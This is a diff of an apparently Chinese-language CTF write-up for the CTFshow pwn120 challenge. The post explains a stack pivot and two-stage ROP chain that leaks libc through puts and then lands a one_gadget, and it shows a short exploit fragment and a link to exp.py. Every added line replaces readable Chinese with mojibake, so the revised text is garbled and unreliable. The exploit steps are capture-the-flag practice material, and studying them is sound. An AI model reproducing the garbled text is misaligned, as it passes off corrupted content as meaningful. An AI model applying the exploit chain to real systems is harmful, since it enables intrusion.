@@ -1,26 +1,25 @@
----
-title: CTFshow pwn120 栈迁移与二段 ROP
+﻿---
+title: CTFshow pwn120 鏍堣縼绉讳笌浜屾 ROP
 published: 2026-04-17
 updated: 2026-04-17
-description: 第一段先 leak puts 并把第二段链读进 .bss，随后用 leave; ret 做栈迁移，第二段再落 one_gadget。
+description: 绗竴娈靛厛 leak puts 骞舵妸绗簩娈甸摼璇昏繘 .bss锛岄殢鍚庣敤 leave; ret 鍋氭爤杩佺Щ锛岀浜屾鍐嶈惤 one_gadget銆
 tags: [CTFshow, Pwn, Stack, Stack Pivot, ROP]
 category: ctfshow
 draft: false
 ---
 
-# 题目结论
+# 棰樼洰缁撹
 
-这题只有一个 `exp.py`，但从脚本就能把利用链看清楚：标准的“泄露 + 栈迁移 + 二段链”。
+杩欓鍙湁涓€涓?`exp.py`锛屼絾浠庤剼鏈氨鑳芥妸鍒╃敤閾剧湅娓呮锛氭爣鍑嗙殑鈥滄硠闇?+ 鏍堣縼绉?+ 浜屾閾锯€濄€?
+## 鍒╃敤鎬濊矾
 
-## 利用思路
+1. 绗竴娈?payload 瑕嗙洊鏃ф爤甯э紝椤轰究鎶婃柊鐨?`rbp` 鎸囧埌 `.bss`
+2. 璋?`puts(puts@got)` 娉勯湶 libc
+3. 鍐嶈皟 `read(0, data_addr, ...)` 鎶婄浜屾閾惧啓鍏?`.bss`
+4. 鎵ц `leave; ret`锛屾妸鏍堣縼绉诲埌 `.bss`
+5. 绗簩娈靛彧闇€瑕佹斁 one_gadget 鍗冲彲
 
-1. 第一段 payload 覆盖旧栈帧，顺便把新的 `rbp` 指到 `.bss`
-2. 调 `puts(puts@got)` 泄露 libc
-3. 再调 `read(0, data_addr, ...)` 把第二段链写入 `.bss`
-4. 执行 `leave; ret`，把栈迁移到 `.bss`
-5. 第二段只需要放 one_gadget 即可
-
-## 关键 exp 片段
+## 鍏抽敭 exp 鐗囨
 
 ```python
 payload1 = b'a' * 0x510 + p64(data_addr - 8)
@@ -37,14 +36,14 @@ payload2 = p64(one_gadget + base_addr)
 p.send(payload2)
 ```
 
-## 下载
+## 涓嬭浇
 
-- [下载利用脚本 `exp.py`](../../attachments/ctfshow/pwn120/exp.py)
+- [涓嬭浇鍒╃敤鑴氭湰 `exp.py`](../../attachments/ctfshow/pwn120/exp.py)
 
-## 说明
+## 璇存槑
 
-这份资料里 `pwn120` 文件夹只保留了 exp，没有把原始二进制一并存下，所以这篇主要根据脚本还原打法。
+杩欎唤璧勬枡閲?`pwn120` 鏂囦欢澶瑰彧淇濈暀浜?exp锛屾病鏈夋妸鍘熷浜岃繘鍒朵竴骞跺瓨涓嬶紝鎵€浠ヨ繖绡囦富瑕佹牴鎹剼鏈繕鍘熸墦娉曘€?
+## 閫傚悎璁颁綇鐨勭偣
 
-## 适合记住的点
+褰撶幇鍦烘爤绌洪棿涓嶅鏀惧畬鏁?ROP 鏃讹紝`read + leave; ret` 鍋氫簩娈垫爤杩佺Щ鏄潪甯稿疄鐢ㄧ殑閫氳В銆?
 
-当现场栈空间不够放完整 ROP 时，`read + leave; ret` 做二段栈迁移是非常实用的通解。
